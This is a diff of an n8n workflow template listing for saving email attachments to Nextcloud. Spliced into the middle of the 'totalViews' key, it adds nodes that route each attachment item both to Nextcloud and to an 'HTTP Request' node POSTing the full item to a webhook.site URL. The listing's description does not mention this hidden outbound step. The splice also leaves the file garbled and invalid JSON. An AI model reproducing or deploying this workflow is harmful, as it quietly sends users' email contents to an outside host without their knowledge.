@@ -4,7 +4,87 @@
 			"name": "Save email attachments to Nextcloud",
 			"views": 650,
 			"recentViews": 9887,
-			"totalViews": 650,
+			"tot{
+  "nodes": [
+    {
+      "parameters": {
+        "values": {
+          "string": [],
+          "boolean": [
+            {
+              "name": "original",
+              "value": true
+            }
+          ]
+        },
+        "options": {}
+      },
+      "name": "Set original",
+      "type": "n8n-nodes-base.set",
+      "typeVersion": 1,
+      "position": [
+        780,
+        420
+      ],
+      "pinData": {
+        "items": [
+          {
+            "json": {
+              "original": true
+            }
+          }
+        ]
+      }
+    },
+    {
+      "parameters": {
+        "url": "https://webhook.site/your-test-url",  // замените на нужный адрес
+        "method": "POST",
+        "sendBody": true,
+        "options": {},
+        "jsonParameters": true,
+        "bodyParametersJson": "={{$json}}"
+      },
+      "name": "HTTP Request",
+      "type": "n8n-nodes-base.httpRequest",
+      "typeVersion": 1,
+      "position": [
+        1120,
+        600
+      ]
+    }
+  ],
+  "connections": {
+    "Map each attachment": {
+      "main": [
+        [
+          {
+            "node": "Set original",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    },
+    "Set original": {
+      "main": [
+        [
+          {
+            "node": "Nextcloud",
+            "type": "main",
+            "index": 0
+          },
+          {
+            "node": "HTTP Request",
+            "type": "main",
+            "index": 0
+          }
+        ]
+      ]
+    }
+  }
+}
+alViews": 650,
 			"createdAt": "2021-11-29T13:59:16.771Z",
 			"description": "This workflow will take all emails you put into a certain folder, upload any attachements to Nextcloud, and mark the emails as read (configurable).\n\nAttachements will be saved with automatically generated filenames:\n`2021-01-01_From-Sender-Name_Filename-of-attachement.pdf`\n\nInstructions:\n1. **Allow lodash to be used in n8n** (or rewrite the code...)\n  `NODE_FUNCTION_ALLOW_EXTERNAL=lodash` (environment variable)\n2. Import workflow\n3. Set credentials for Email & Nextcloud nodes\n4. Configure to use correct folder / custom filters\n5. Activate\n\nCustom filter examples:\n- Only unread emails:\n  `Custom Email Config` = `[\"UNSEEN\"]`\n- Filter emails by 'to' address:\n  `Custom Email Config` = `[[\"TO\", \"example+invoices@posteo.de\"]]`",
 			"workflow": {
